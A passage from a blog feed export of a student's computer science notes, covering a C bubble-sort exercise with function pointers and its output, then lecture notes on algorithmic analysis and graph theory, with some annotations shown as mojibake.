____Q1_____; _____Q2____) &#123;          for (int i = 0; i&lt;=iMax; i++) &#123;        //     if (_____Q3_____) &#123;          if (compare(ptr[i], ptr[i+1])) &#123;        //         ____Q4____;              swap(ptr+i, ptr+i+1);              // swap(&amp;ptr[i], &amp;ptr[i+1]); is also OK            &#125;        &#125;           &#125;&#125;int TestBubbleSort2(void) &#123;        int arr[] = &#123;30, 50, 20, 10, 60, 40&#125;;    int len = sizeof(arr) / sizeof(arr[0]);    // a function pointer variable which points to the function IsLarger()    ComparatorFuncPtr fptr = &amp;IsLarger;        printf(&quot;Before sorting:\n&quot;);    PrintArray(arr, len);    BubbleSort2(arr, len, fptr);    // in ascending order    printf(&quot;After sorting:\n&quot;);    PrintArray(arr, len);    // a function pointer variable which points to the function IsLess()    // fptr = ____Q5____;        fptr=IsLess; // Both `IsLess` and `&amp;IsLess` is OK, they are all function pointer. The function pointer declarification:  typedef int (*ComparatorFuncPtr)(int, int);    printf(&quot;\nBefore sorting:\n&quot;);    PrintArray(arr, len);    BubbleSort2(arr, len, fptr);    // in descending order    printf(&quot;After sorting:\n&quot;);    PrintArray(arr, len);    return 0;&#125;#endifint main(void) &#123;        // Let the C compiler determine the number of array elements for us.    int arr[] = &#123;30, 50, 20, 10, 60, 40&#125;;    // calculate the number of elements    int len = sizeof(arr) / sizeof(arr[0]);    // int t1 = sizeof(arr);  // print 24    // int t2 = sizeof(arr[0]);  // print 4    // int t3 = sizeof(arr+1);  // print 8    // arr is an array; arr[0] is a value;     // sizeof(arr) means the size of the array    // sizeof(arr+1) means the size of the address (arr+1), in 64-bit OS, it&#39;s always 8 Bytes.    // refer to my blog: https://senranja.github.io/2024/10/30/Cpp/Declaring-arrays-and-out-of-bounds/    // they have nusances when use sizeof() function.    printf(&quot;Before sorting:\n&quot;);    PrintArray(arr, len);    BubbleSort(arr, len);    printf(&quot;After sorting:\n&quot;);    PrintArray(arr, len);    printf(&quot;\n\nWhy Swap2(i, j) doesn&#39;t work?\n\n&quot;);    int i = 20, j = 24;    printf(&quot;i = %d, j = %d\n\n&quot;, i, j);    printf(&quot;\nSwap2(i, j)\n&quot;);    // The values of i and j are passed.    Swap2(i, j);    printf(&quot;i = %d, j = %d\n\n&quot;, i, j);    printf(&quot;After completing the code in Q1-Q5 (BubbleSort.c), please also uncomment line %d in %s:\n\n&quot;, (__LINE__ + 1), __FILE__);    TestBubbleSort2();    return 0;&#125;</code></pre><p>Output:</p><pre><code>Before sorting:30 50 20 10 60 40 ............... iMax = 4 ...............30 50 20 10 60 40 After swapping ptr[1] and ptr[2]:30 20 50 10 60 40 After swapping ptr[2] and ptr[3]:30 20 10 50 60 40 After swapping ptr[4] and ptr[5]:30 20 10 50 40 60 ............... iMax = 3 ...............30 20 10 50 40 After swapping ptr[0] and ptr[1]:20 30 10 50 40 After swapping ptr[1] and ptr[2]:20 10 30 50 40 After swapping ptr[3] and ptr[4]:20 10 30 40 50 ............... iMax = 2 ...............20 10 30 40 After swapping ptr[0] and ptr[1]:10 20 30 40 ............... iMax = 1 ...............10 20 30 ............... iMax = 0 ...............10 20 After sorting:10 20 30 40 50 60 Why Swap2(i, j) doesn&#39;t work?z5541664@vx17:~/COMP9024/Tutorials/Week2$ lsbuild  diagrams  images  main  Makefile  README.md  srcz5541664@vx17:~/COMP9024/Tutorials/Week2$ ./main Before sorting:30 50 20 10 60 40 ............... iMax = 4 ...............30 50 20 10 60 40 After swapping ptr[1] and ptr[2]:30 20 50 10 60 40 After swapping ptr[2] and ptr[3]:30 20 10 50 60 40 After swapping ptr[4] and ptr[5]:30 20 10 50 40 60 ............... iMax = 3 ...............30 20 10 50 40 After swapping ptr[0] and ptr[1]:20 30 10 50 40 After swapping ptr[1] and ptr[2]:20 10 30 50 40 After swapping ptr[3] and ptr[4]:20 10 30 40 50 ............... iMax = 2 ...............20 10 30 40 After swapping ptr[0] and ptr[1]:10 20 30 40 ............... iMax = 1 ...............10 20 30 ............... iMax = 0 ...............10 20 After sorting:10 20 30 40 50 60 Why Swap2(i, j) doesn&#39;t work?i = 20, j = 24Swap2(i, j)a = 20, b = 24a = 24, b = 20i = 20, j = 24After completing the code in Q1-Q5 (BubbleSort.c), please also uncomment line 156 in src/BubbleSort.c:Before sorting:30 50 20 10 60 40 90 60 120 150 35 After sorting:10 20 30 35 40 50 60 60 90 120 150</code></pre>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Algorithmic_Analysis</title>
      <link href="/2024/11/20/Math/Algorithmic-Analysis/"/>
      <url>/2024/11/20/Math/Algorithmic-Analysis/</url>
      
        <content type="html"><![CDATA[<p>Lecture 18: Algorithmic Analysis</p><ul><li><a href="#motivation">Motivation</a><ul><li><a href="#issues">Issues</a></li><li><a href="#order-of-growth">Order of growth</a></li></ul></li><li><a href="#standard-approach">Standard Approach</a><ul><li><a href="#algorithmic-analysis">Algorithmic analysis</a></li><li><a href="#elementary-operations">Elementary operations</a></li></ul></li><li><a href="#examples">Examples</a><ul><li><a href="#running-time-vs-execution-time">Running time vs Execution time</a></li><li><a href="#squaring">Squaring</a></li><li><a href="#cubing">Cubing</a></li></ul></li><li><a href="#simplifying-with-worst-case-and-big-o">Simplifying with Worst Case and Big-O</a><ul><li><a href="#worst-case-and-big-o">Worst-case and big-O</a></li><li><a href="#sum-of-square">sum of Square</a></li><li><a href="#find-an-element-from-an-array">Find an element from an array</a></li></ul></li><li><a href="#recursive-examples">Recursive Examples</a><ul><li><a href="#factorial">Factorial</a></li><li><a href="#master-theorom">Master Theorom</a></li><li><a href="#sum-elements-of-a-linked-list">Sum elements of a linked list</a></li><li><a href="#insertion-sort">Insertion sort</a></li><li><a href="#euclidean-algorithm">Euclidean algorithm</a></li><li><a href="#recursive-examples-1">Recursive examples</a></li></ul></li><li><a href="#faster-euclidean">Faster Euclidean</a><ul><li><a href="#pow">pow</a></li></ul></li></ul><h1 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h1><p>Want to compare algorithmsâ€“ particularly ones that can solve arbitrarily large instances.</p><p>We would like to be able to talk about the resources (running time, memory, energy consumption) required by a program/algorithm as a function f (n) of some parameter n (e.g. the size) of its input.</p><p>Example</p><p>How long does a given sorting algorithm take to run on a list of n elements?</p><h2 id="Issues"><a href="#Issues" class="headerlink" title="Issues"></a>Issues</h2><p><strong>Problems</strong></p><ol><li>The exact resources required for an algorithm are difficult to pin down. Heavily dependent on:</li></ol><ul><li>Environment the program is run in (hardware, software, choice of language, external factors, etc)</li><li>Choice of inputs used</li></ul><ol><li>Cost functions can be complex, e.g.</li></ol><script type="math/tex; mode=display">2 n log(n) + (n âˆ’100) log(n)^2 + \frac{1}{2^n} log(log(n))</script><p>Need to identify the â€œimportantâ€ aspects of the function.</p><h2 id="Order-of-growth"><a href="#Order-of-growth" class="headerlink" title="Order of growth"></a>Order of growth</h2><p>Consider two <strong>time-cost</strong> functions:</p><ul><li>$f_1(n)=\frac{1}{10}n^2$ milliseconds, and</li><li>$f_2(n)=10n log n$ milliseconds</li></ul><div class="table-container"><table><thead><tr><th>Input size</th><th>f1(n)</th><th>f2(n)</th></tr></thead><tbody><tr><td>100</td><td>0.01s</td><td>2s</td></tr><tr><td>1000</td><td>1s</td><td>30s</td></tr><tr><td>10000</td><td>1m40s</td><td>6m40s</td></tr><tr><td>100000</td><td>2h47m</td><td>1h23m</td></tr><tr><td>1000000</td><td>11d14h</td><td>16h40m</td></tr><tr><td>10000000</td><td>3y3m</td><td>8d2h</td></tr></tbody></table></div><h1 id="Standard-Approach"><a href="#Standard-Approach" class="headerlink" title="Standard Approach"></a>Standard Approach</h1><h2 id="Algorithmic-analysis"><a href="#Algorithmic-analysis" class="headerlink" title="Algorithmic analysis"></a>Algorithmic analysis</h2><p>Asymptotic analysis is about how costs <strong>scale</strong> as the input increases.</p><p>Standard (default) approach:</p><ul><li>Consider <strong>asymptotic growth</strong> of cost functions</li><li>Consider <strong>worst-case</strong> (highest cost) inputs</li><li>Consider <strong>running time cost</strong>: number of elementary operations</li></ul><p><strong>Take Notice</strong></p><p>Other common analyses include:</p><ul><li>Average-case analysis</li><li>Space (memory) cost</li></ul><h2 id="Elementary-operations"><a href="#Elementary-operations" class="headerlink" title="Elementary operations"></a>Elementary operations</h2><p>Informally: A single computational â€œstepâ€; something that takes a constant number of computation cycles.</p><p>Examples:</p><ul><li>Arithmetic operations</li><li>Comparison of two values</li><li>Assignment of a value to a variable</li><li>Accessing an element of an array</li><li>Calling a function</li><li>Returning a value</li><li>Printing a single character</li></ul><p><strong>Take Notice</strong></p><p>Count operations up to a constant factor, <strong>O(1)</strong>, rather than an exact number.</p><h1 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h1><p>Squaring a number (First version):</p><pre><code>square(n) :    return n âˆ— n // ------ O(1)</code></pre><p><strong>Running time</strong>: O(1)</p><h2 id="Running-time-vs-Execution-time"><a href="#Running-time-vs-Execution-time" class="headerlink" title="Running time vs Execution time"></a>Running time vs Execution time</h2><p>Previous example shows one difference between running time and execution time.</p><p>In general, running time only approximates execution time:</p><ul><li>Simplifying assumptions about elementary operations</li><li>Hidden constants in <strong>big-O</strong></li><li><strong>Big-O</strong> only looks at limiting performance as n gets large.</li></ul><p>Implementations of square(n) will take longer as n gets bigger</p><h2 id="Squaring"><a href="#Squaring" class="headerlink" title="Squaring"></a>Squaring</h2><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-13-48-32.png" alt></p><h2 id="Cubing"><a href="#Cubing" class="headerlink" title="Cubing"></a>Cubing</h2><p>Note the function square() is from the above algorithm, hence itâ€™s n loop of $O(n) -&gt; O(n^2)$</p><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-13-49-08.png" alt></p><h1 id="Simplifying-with-Worst-Case-and-Big-O"><a href="#Simplifying-with-Worst-Case-and-Big-O" class="headerlink" title="Simplifying with Worst Case and Big-O"></a>Simplifying with Worst Case and Big-O</h1><h2 id="Worst-case-and-big-O"><a href="#Worst-case-and-big-O" class="headerlink" title="Worst-case and big-O"></a>Worst-case and big-O</h2><p>Worst-case input assumption and big-O combine to simplify the analysis:</p><p>æ³¨æ„ï¼Œè¿™é‡Œçš„ <code>for i = 1 to n:</code> è¿™é‡Œçš„$O(1)$ æ˜¯  <code>i=1</code>ï¼Œè¿™é‡Œæ˜¯ n times æ‰€ä»¥æ•´ä¸ªforå¾ªç¯åé¢éœ€è¦å† n times æˆ $O(n^2)$ã€‚æœ‰å¾ªç¯çš„æƒ…å†µä¸‹ï¼Œéœ€è¦ä¸€å±‚ä¸€å±‚åˆ†æï¼Œå…ˆä¸è€ƒè™‘å¾ªç¯å»çœ‹æ¯ä¸ªå•ç‹¬çš„æ‰§è¡Œè¯­å¥è¿›è¡Œ<strong>å’Œ</strong>æ“ä½œï¼Œå†ç”¨<strong>forå¾ªç¯</strong>è¿›è¡Œ<strong>ä¹˜</strong>æ“ä½œã€‚</p><h2 id="sum-of-Square"><a href="#sum-of-Square" class="headerlink" title="sum of Square"></a>sum of Square</h2><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-13-55-58.png" alt></p><p><strong>Take Notice</strong></p><p>Simplifications might lead to <strong>sub-optimal bounds</strong>, may have to do a better analysis to get best bounds:</p><ul><li>Finer-grained upper bound analysis</li><li>Analyse specific cases to find a matching lower bound (big-â„¦)</li></ul><p>Take Notice</p><p>Big-â„¦ is a <strong>lower bound</strong> analysis of the worst-case; NOT a â€œbest-caseâ€ analysis.</p><p>Analyse specific cases to find a matching <strong>lower bound (big-â„¦)</strong></p><h2 id="Find-an-element-from-an-array"><a href="#Find-an-element-from-an-array" class="headerlink" title="Find an element from an array"></a>Find an element from an array</h2><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-14-02-09.png" alt></p><h1 id="Recursive-Examples"><a href="#Recursive-Examples" class="headerlink" title="Recursive Examples"></a>Recursive Examples</h1><p>æ­¤å¤„æ¶‰åŠäº†é€’å½’é‚£é‡Œçš„â€œmaster theoremâ€</p><h2 id="Factorial"><a href="#Factorial" class="headerlink" title="Factorial"></a>Factorial</h2><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-14-04-10.png" alt></p><p>I listed the Master Theorem and Linear differences here, please regard the a=1 condition to apply the <code>T(n)</code> above.</p><h2 id="Master-Theorom"><a href="#Master-Theorom" class="headerlink" title="Master Theorom"></a>Master Theorom</h2><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-14-28-09.png" alt></p><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-14-29-17.png" alt></p><h2 id="Sum-elements-of-a-linked-list"><a href="#Sum-elements-of-a-linked-list" class="headerlink" title="Sum elements of a linked list"></a>Sum elements of a linked list</h2><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-14-33-18.png" alt></p><p>the k=1, so itâ€™s $O(n^{1+1})=O(n^2)$</p><h2 id="Insertion-sort"><a href="#Insertion-sort" class="headerlink" title="Insertion sort"></a>Insertion sort</h2><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-14-35-31.png" alt></p><h2 id="Euclidean-algorithm"><a href="#Euclidean-algorithm" class="headerlink" title="Euclidean algorithm"></a>Euclidean algorithm</h2><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-14-37-00.png" alt></p><h2 id="Recursive-examples"><a href="#Recursive-examples" class="headerlink" title="Recursive examples"></a>Recursive examples</h2><p>Euclidean algorithm for $gcd(m,n) (N = m + n)$:</p><p>Running time: $O(N)$</p><p><strong>Take Notice</strong></p><p>N is not the input <strong>size</strong>. Input size is $log(m) + log(n)$</p><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-14-41-22.png" alt></p><p><img src="/2024/11/20/Math/Algorithmic-Analysis/N=m+n.png" alt></p><h1 id="Faster-Euclidean"><a href="#Faster-Euclidean" class="headerlink" title="Faster Euclidean"></a>Faster Euclidean</h1><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-14-53-33.png" alt></p><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-14-57-34.png" alt></p><h2 id="pow"><a href="#pow" class="headerlink" title="pow"></a>pow</h2><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-14-57-58.png" alt></p><p><img src="/2024/11/20/Math/Algorithmic-Analysis/2024-11-20-14-58-13.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Graph_Theory</title>
      <link href="/2024/11/19/Math/Graph-Theory/"/>
      <url>/2024/11/19/Math/Graph-Theory/</url>
      
        <content type="html"><![CDATA[<p>Lecture 16: Graph Theory</p><ul><li><a href="#motivation-and-applications">Motivation and Applications</a><ul><li><a href="#graph-theory-historical-motivation">Graph theory: Historical Motivation</a></li><li><a href="#graphs-in-computer-science">Graphs in Computer Science</a></li></ul></li><li><a href="#terminology-and-notation">Terminology and Notation</a><ul><li><a href="#graph-representations">Graph representations</a></li><li><a href="#paths">Paths</a></li><li><a href="#connectedness">Connectedness</a></li><li><a href="#vertex-degrees-undirected-graphs">Vertex Degrees (Undirected graphs)</a><ul><li><a href="#question">Question</a></li></ul></li><li><a href="#vertex-degrees-directed-graphs">Vertex Degrees (Directed graphs)</a></li><li><a href="#exercise-1">Exercise 1</a></li><li><a href="#exercise-2">Exercise 2</a></li><li><a href="#cycles">Cycles</a></li><li><a href="#trees">Trees</a></li><li><a href="#trees-1">Trees</a></li><li><a href="#exercise-supplementary">Exercise (Supplementary)</a></li><li><a href="#bipartite-graphs">Bipartite Graphs</a></li><li><a href="#special-graphs">Special Graphs</a><ul><li><a href="#complete-graph-k_n">Complete graph $K_n$</a></li><li><a href="#complete-bipartite-graph-k_mn">Complete bipartite graph $K_{m,n}$</a></li><li><a href="#complete-k-partite-graph-k_m_1m_k">Complete k-partite graph $K_{m_1,â€¦,m_k}$</a></li></ul></li><li><a href="#graph-isomorphisms">Graph Isomorphisms</a></li></ul></li><li><a href="#graph-traversals">Graph Traversals</a><ul><li><a href="#graph-exploration">Graph exploration</a></li><li><a href="#special-types-of-traversals">Special types of traversals</a></li><li><a href="#edge-traversal">Edge Traversal</a><ul><li><a href="#definition">Definition</a></li><li><a href="#characterisations">Characterisations</a></li><li><a href="#exercise-1-1">exercise 1</a></li><li><a href="#exercise-2-1">exercise 2</a></li><li><a href="#exercise-3">exercise 3</a></li></ul></li><li><a href="#vertex-traversal">Vertex Traversal</a><ul><li><a href="#definition-1">Definition</a></li></ul></li></ul></li><li><a href="#properties-of-graphs">Properties of Graphs</a><ul><li><a href="#colouring">Colouring</a></li><li><a href="#properties-of-the-chromatic-number">Properties of the Chromatic Number</a></li><li><a href="#cliques">Cliques</a><ul><li><a href="#definition-2">Definition</a></li></ul></li><li><a href="#theorem">Theorem</a></li><li><a href="#exercise-1-2">exercise 1</a></li><li><a href="#exercise-2-2">exercise 2</a></li><li><a href="#timetable-scheduling">Timetable scheduling</a></li><li><a href="#planar-graphs">Planar Graphs</a><ul><li><a href="#definition-3">Definition</a></li><li><a href="#theorem-1">Theorem</a></li><li><a href="#take-notice">Take Notice</a></li></ul></li><li><a href="#nonplanar-graphs">Nonplanar graphs</a></li><li><a href="#three-utilities-problem">Three utilities problem</a></li><li><a href="#testing-for-nonplanarity">Testing for nonplanarity</a><ul><li><a href="#theorem-2">Theorem</a></li><li><a href="#theorem-3">Theorem</a></li></ul></li><li><a href="#more-nonplanar-graphs">More nonplanar graphs</a><ul><li><a href="#theorem-4">Theorem</a></li><li><a href="#proof">Proof</a></li><li><a href="#theorem-5">Theorem</a></li><li><a href="#proof-1">Proof</a></li><li><a href="#exercise-1-3">exercise 1</a></li><li><a href="#exercise-2-3">exercise 2</a></li></ul></li></ul></li></ul><h1 id="Motivation-and-Applications"><a href="#Motivation-and-Applications" class="headerlink" title="Motivation and Applications"></a>Motivation and Applications</h1><h2 id="Graph-theory-Historical-Motivation"><a href="#Graph-theory-Historical-Motivation" class="headerlink" title="Graph theory: Historical Motivation"></a>Graph theory: Historical Motivation</h2><p>Bridges of KÂ¨onigsberg problem</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-18-35-23.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-18-35-38.png" alt></p><p>Can you find a route which crosses each bridge exactly once?</p><p>No! It doesnâ€™t have such a solution.</p><p>Five rooms problem</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-18-38-30.png" alt></p><p>Can you find a route which passes through each door exactly once?</p><p>Crossed house problem</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-18-38-50.png" alt></p><p>Can you draw this without taking your pen off the paper?</p><p>Three utilities problem</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-18-39-20.png" alt></p><p>Can you connect all utilities to all houses without crossing connections?</p><p>The following table describes several subjects and the students taking them:</p><div class="table-container"><table><thead><tr><th>Potions</th><th>Charms</th><th>Herbology</th><th>Astronomy</th><th>Transfiguration</th></tr></thead><tbody><tr><td>Harry</td><td>Ron</td><td>Harry</td><td>Hermione</td><td>Hermione</td></tr><tr><td>Ron</td><td>Luna</td><td>George</td><td>Neville</td><td>Fred</td></tr><tr><td>Malfoy</td><td>Ginny</td><td>Neville</td><td>Seamus</td><td>Luna</td></tr></tbody></table></div><p>How many examination timeslots are needed so that no student has two (or more) exams at the same time?</p><h2 id="Graphs-in-Computer-Science"><a href="#Graphs-in-Computer-Science" class="headerlink" title="Graphs in Computer Science"></a>Graphs in Computer Science</h2><p>Applications of graphs in Computer Science are abundant, e.g.</p><ul><li>route planning in navigation systems, robotics</li><li>optimisation, e.g. timetables, utilisation of network structures, bandwidth allocation</li><li>compilers using â€œgraph colouringâ€ to assign registers to program variables</li><li>circuit layout (Untangle game)</li><li>determining the significance of a web page (Googleâ€™s pagerank algorithm)</li><li>modelling the spread of a virus in a computer network or news in social network</li></ul><h1 id="Terminology-and-Notation"><a href="#Terminology-and-Notation" class="headerlink" title="Terminology and Notation"></a>Terminology and Notation</h1><p>Terminology (the most common; there are many variants): </p><p><strong>Graph</strong> â€” pair (V,E) where Vâ€“ set of vertices (or nodes) Eâ€“ set of edges</p><p><strong>Undirected graph</strong>: Every edge e âˆˆ E is a two-element set of vertices, i.e. e = {x,y} âŠ† V where x= y</p><p><strong>Directed graph</strong>: Every edge (or arc) e âˆˆ E is an ordered pair of vertices, i.e. e = (x,y) âˆˆ V Ã—V, note x may equal y.</p><h2 id="Graph-representations"><a href="#Graph-representations" class="headerlink" title="Graph representations"></a>Graph representations</h2><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-18-46-04.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-18-46-14.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-18-47-07.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-18-48-17.png" alt></p><p>æˆ‘å¯¹è¿™ä¸ªå›¾çš„ç†è§£ï¼Œæ— å‘å›¾ï¼Œæ¨ªåæ ‡æ˜¯å®šç‚¹ï¼Œçºµåæ ‡æ˜¯é‚£å‡ ä¸ªEdgeï¼›æœ‰å‘å›¾ï¼Œæ¨ªçºµåæ ‡éƒ½æ˜¯å®šç‚¹ï¼Œçºµå°„å‘æ¨ªï¼ˆå¥½åƒä¸å¯¹ï¼‰ï¼Œå®Œäº†é—®é—®ã€‚</p><h2 id="Paths"><a href="#Paths" class="headerlink" title="Paths"></a>Paths</h2><p>A (directed) walk in a (directed) graph (V,E) is a sequence of edges that link up</p><script type="math/tex; mode=display">v_0 \overset{\{v_0,v_1\}}{â†’} v_1 \overset{\{v_1,v_2\}}{â†’} ... \overset{\{v_{n-1},v_n\}}{â†’} v_n</script><p>where $e<em>i$ = {$v</em>{iâˆ’1},v<em>i$} âˆˆ $E (or \quad e_i = (v</em>{iâˆ’1},v_i) âˆˆ E)$</p><p>A <strong>trail</strong> is a walk where no edge is repeated. $(âˆ€i, j âˆˆ [n],e_i \neq e_j)$</p><p>trailè¿‡è¾¹ï¼Œç‚¹é‡å¤</p><p>A <strong>path</strong> is a walk where no vertex is repeated $(âˆ€i, j âˆˆ$ {0,â€¦n âˆ’ 1}$,v_i \neq v_j)$</p><p>pathè¿‡ç‚¹ï¼Œè¾¹é‡å¤</p><p><strong>length</strong> of a walk is the number of edges: n neither the vertices nor the edges have to be all different</p><p>Subpath\subwalk of length $r: (e<em>m,e</em>{m+1},â€¦,e_{m+râˆ’1})$</p><p>Path of length 0: single vertex $v_0$</p><h2 id="Connectedness"><a href="#Connectedness" class="headerlink" title="Connectedness"></a>Connectedness</h2><p><strong>Connected set/graph</strong> (<strong>undirected</strong>) â€” each pair of vertices joined by a path</p><p><strong>Strongly connected set/graph</strong> (<strong>directed</strong>) â€” each pair of vertices joined by a directed <strong>path</strong> in both directions</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-19-15-23.png" alt></p><p>Given a graph $G = (V,E)$, we call a set of vertices $U âŠ† V$ a <strong>connected component</strong> of G, if every pair of vertices $u, v âˆˆ U$ is connected by some <strong>path</strong>, and $U$ is maximal with this property.</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-19-18-25.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-19-23-40.png" alt></p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-19-19-27-00.png" alt></p><h2 id="Vertex-Degrees-Undirected-graphs"><a href="#Vertex-Degrees-Undirected-graphs" class="headerlink" title="Vertex Degrees (Undirected graphs)"></a>Vertex Degrees (Undirected graphs)</h2><p><strong>Degree</strong> of a vertex</p><script type="math/tex; mode=display">deg(v) = |\{ w âˆˆ V :\{v,w\} âˆˆ E \}|</script><p>i.e., the number of edges attached to the vertex</p><p><strong>Regular graph</strong> â€” all degrees are equal</p><p><strong>Degree sequence</strong> $D_0,D_1,D_2,â€¦,D_k$ of graph $G = (V,E)$, where $D_i$ = no. of vertices of degree i</p><p>æ³¨æ„å•Šï¼Œè¿™ä¸ªä¸‹æ ‡ï¼Œä¸æ˜¯è¯´ç¬¬å‡ ä¸ªç‚¹çš„åº¦æ•°ï¼Œæ˜¯æœ‰å‡ ä¸ªåº¦çš„ç‚¹ã€‚</p><h3 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h3><p>What is $D_0 +D_1 +â€¦+D_k$?</p><p><strong>Fact</strong></p><p>$\sum_{v \in V} deg(v) = 2Â·|E|$; so the sum of vertex degrees is always even.</p><p><strong>Corollary</strong></p><p>There is an even number of vertices of odd degree.</p><h2 id="Vertex-Degrees-Directed-graphs"><a href="#Vertex-Degrees-Directed-graphs" class="headerlink" title="Vertex Degrees (Directed graphs)"></a>Vertex Degrees (Directed graphs)</h2><p><strong>Out-degree</strong> of a vertex</p><script type="math/tex; mode=display">outdeg(v) = |\{ w âˆˆ V :(v,w) âˆˆ E \}|</script><p>i.e., the number of edges going out of the vertex</p><p><strong>In-degree</strong> of a vertex</p><script type="math/tex; mode=display">indeg(v) = |\{ w âˆˆ V :(w,v) âˆˆ E \}|</script><p>i.e., the number of edges going in to the vertex</p><p><strong>Fact</strong></p><script type="math/tex; mode=display">\sum_{v \in V} outdeg(v) = \sum_{v \in V} indeg(v) = |E|</script><h2 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise 1"></a>Exercise 1</h2><p>Draw a connected, regular graph on four vertices, each of degree 2</p><p>Draw a connected, regular graph on four vertices, each of degree 3</p><p>Draw a connected, regular graph on five vertices, each of degree 3</p><p>Graph with 3 vertices and 3 edges</p><p>Two graphs each with 4 vertices and 4 edges</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-06-00-33.png" alt></p><p>Take Notice</p><p>We use the notation</p><p>$n =v(G) =|V|$ for the no. of vertices of graph $G = (V,E)$</p><p>$m=e(G)=|E|$ for the no. of edges of graph $G = (V,E)$</p><h2 id="Exercise-2"><a href="#Exercise-2" class="headerlink" title="Exercise 2"></a>Exercise 2</h2><p>Graph with $e(G)=21$ edges has a degree sequence $D_0 =0,D_1 =7,D_2 =3,D_3 =7,D_4 =$?</p><p>Find $v(G)$</p><p>$\sum<em>{v} deg(v)= 2|E|$; here $7 Â· 1+3Â·2+7Â·3+x Â·4=2Â·21$  giving $x = 2$, thus $v(G) = \sum</em>{D_i} =19$.</p><p>How would your answer change, if at all, when $D_0 =6$?</p><p>No change to $D_4$; $v(G) = 25$.</p><p>ç®—é¡¶ç‚¹æ—¶ï¼Œå‹¿å¿˜åŠ $D_0$ (åº¦æ•°ä¸º0çš„å®šç‚¹)</p><h2 id="Cycles"><a href="#Cycles" class="headerlink" title="Cycles"></a>Cycles</h2><p>Recall walks $v_0 \overset{e_1}{â†’} v_1 \overset{e_2}{â†’} â€¦ \overset{e_n}{â†’} v_n$</p><ul><li>closed walk â€” $v_0 = v_n$</li></ul><p>æ„æ€æ˜¯å¦‚æœé¦–å°¾åŒç‚¹ï¼Œæ„å‘³ç€é¦–å°¾ç›¸è¿ï¼Œå°±æ˜¯å°é—­walkã€‚</p><ul><li><strong>cycle</strong> â€” closed walk of length 3 or more (2 or more in directed graphs) whose vertices are distinct except $v_0$ and $v_n$.</li></ul><p>æ— å‘å›¾è‡³å°‘ä¸‰ç‚¹ï¼Œæœ‰å‘å›¾è‡³å°‘ä¸¤ç‚¹ã€‚</p><ul><li>acyclic walk (equivalent to path) â€” $v_i \neq v_j$ for all vertices in the path $(i \neq j)$</li></ul><p><strong>Take Notice</strong></p><p>$C =(e_1,â€¦,e_n)$ is a <strong>cycle</strong> iff removing any single edge leaves a <strong>path</strong>.</p><p>C is a <strong>cycle</strong> if it has the same number of edges and vertices ($|V_G| = |E_G|$) and no proper subwalk has this property.</p><h2 id="Trees"><a href="#Trees" class="headerlink" title="Trees"></a>Trees</h2><p><strong>Acyclic graph</strong> â€” graph that doesnâ€™t contain any cycle </p><p><strong>Tree</strong> â€” connected acyclic [undirected] graph</p><p>A graph is acyclic iff it is a forest (collection of disjoint trees)</p><p>Take Notice</p><p>Graph G is a <strong>tree</strong> if</p><p>â‡” it is acyclic and $|V_G| = |E_G| +1$.</p><p>â‡” there is exactly one path between any two vertices.</p><p>â‡” G is connected, but becomes disconnected if any single edge is removed.</p><p>â‡” G is acyclic, but has a cycle if any single edge on already existing vertices is added.</p><h2 id="Trees-1"><a href="#Trees-1" class="headerlink" title="Trees"></a>Trees</h2><p>A tree with one vertex designated as its root is called a rooted tree.</p><p>It imposes a direction on the edges: â€˜awayâ€™ from the root â€” from parent nodes to children. It also defines a level number (or: depth) of a node as its distance from the root.</p><p>Another very common notion in Computer Science is that of a <strong>DAG</strong> â€”<strong>a directed, acyclic graph</strong>.</p><h2 id="Exercise-Supplementary"><a href="#Exercise-Supplementary" class="headerlink" title="Exercise (Supplementary)"></a>Exercise (Supplementary)</h2><p>(Supp) Tree T with n vertices, $n â‰¥3$. Always true, false or could be either?</p><p>(a) e(T) $\overset{?}{=}$ n</p><p>False. V(T) = E(T) + 1</p><p>(b) at least one vertex of degree exactly 2?</p><p>Could be either</p><p><img src="/2024/11/19/Math/Graph-Theory/2024-11-20-07-04-24.png" alt></p><p>(c) at least two $v_1,v_2$ s.t. $deg(v_1)=deg(v_2)$</p><p>True</p><p>(d) exactly one path from $v_1$ to $v_2$</p><p>True (characterises a tree)</p><h2 id="Bipartite-Graphs"><a href="#Bipartite-Graphs" class="headerlink" title="Bipartite Graphs"></a>Bipartite Graphs</h2><p>Can divide the vertices into two disjoint sets, $V = V_1 